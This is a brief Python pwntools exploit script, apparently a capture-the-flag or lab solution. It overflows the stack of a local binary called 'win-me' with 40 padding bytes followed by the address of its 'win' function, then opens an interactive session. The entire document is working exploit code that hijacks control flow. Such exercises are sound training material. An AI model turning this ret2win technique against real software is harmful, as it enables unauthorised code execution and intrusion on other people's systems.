#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./win-me")

r = process([exe.path])
# gdb.attach(r)

win = exe.symbols["win"]
payload = b"A" * 40 + p64(win)

r.recvuntil(b"Enter your name: ")
r.sendline(payload)

r.interactive()
